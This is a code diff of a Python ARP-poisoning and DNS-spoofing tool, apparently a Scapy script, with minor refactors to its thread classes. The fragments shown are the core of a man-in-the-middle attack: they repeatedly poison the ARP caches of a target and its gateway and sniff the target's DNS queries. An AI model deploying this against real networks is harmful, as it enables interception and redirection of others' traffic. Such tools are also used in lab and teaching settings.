@@ -51,7 +51,7 @@ class ARPPoisonThread(threading.Thread):
         send(packet)
         print ("ARP Table restored to normal for", targetip)
 
-    def _arppoison(self):
+    def run(self):
         try:
             self.targetmac = self._getmac(self.targetip)
         except:
@@ -69,9 +69,6 @@ class ARPPoisonThread(threading.Thread):
             time.sleep(5)
             self._poisonarpcache(self.targetip, self.targetmac, self.gatewayip)
             self._poisonarpcache(self.gatewayip, self.gatewaymac, self.targetip)
-
-    def run(self):
-        self._arppoison()
 
     def join(self, timeout=None):
         print ("ARP spoofing stopped")
@@ -107,7 +104,7 @@ class DNSPoisonThread(threading.Thread):
 
     def run(self):
         #Only do packet sniffing
-        sniff(  filter=f'host {self.targetip} and udp and port 53',\
+        sniff(  filter=f'host {self.targetip} and udp port 53',\
                 prn=self._analysis)
 
     def join(self, timeout=None):
@@ -116,7 +113,6 @@ class DNSPoisonThread(threading.Thread):
 import argparse
 
 def args():
-
     arg_parser = argparse.ArgumentParser()
     arg_parser.add_argument('gatewayip', metavar='G', help='IP address of the gateway')
     arg_parser.add_argument('targetip', metavar='T', help='IP address of the target')
